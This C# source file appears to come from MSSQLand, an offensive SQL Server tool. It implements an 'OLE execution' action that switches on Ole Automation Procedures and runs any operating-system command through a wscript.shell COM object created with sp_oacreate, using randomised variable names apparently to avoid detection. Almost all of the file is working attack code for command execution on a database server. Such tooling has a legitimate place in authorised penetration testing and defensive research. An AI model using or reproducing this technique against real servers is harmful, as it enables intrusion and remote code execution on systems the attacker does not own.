// MSSQLand/Actions/Execution/ObjectLinkingEmbedding.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;


namespace MSSQLand.Actions.Execution
{
    /// <summary>
    /// Enables interaction with COM objects from within SQL Server for external operations.
    /// </summary>
    internal class ObjectLinkingEmbedding : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, Description = "Operating system command to execute")]
        private string _command;

        /// <summary>
        /// Validates the provided command argument.
        /// </summary>
        /// <param name="args">The command to be executed.</param>
        public override void ValidateArguments(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                throw new ArgumentException("A command must be provided for OLE execution. Usage: <command>");
            }

            _command = string.Join(" ", args);
        }

        public override object Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Executing OLE command: {_command}");

            // Ensure 'Ole Automation Procedures' are enabled
            if (!databaseContext.ConfigService.SetConfigurationOption("Ole Automation Procedures", 1))
            {
                Logger.Error("[!] Unable to enable Ole Automation Procedures. Ensure you have the necessary permissions.");
                return null;
            }

            // Generate two random string of 3 to 12 chars
            string output = Guid.NewGuid().ToString("N").Substring(0, 6);
            string program = Guid.NewGuid().ToString("N").Substring(0, 6);

            string query = $"DECLARE @{output} INT; DECLARE @{program} VARCHAR(255);SET @{program} = 'Run(\"{_command}\")';EXEC sp_oacreate 'wscript.shell', @{output} out;EXEC sp_oamethod @{output}, @{program};EXEC sp_oadestroy @{output};";

            databaseContext.QueryService.ExecuteNonProcessing(query);
            Logger.Success("Executed command");

            return null;

        }
    }
}
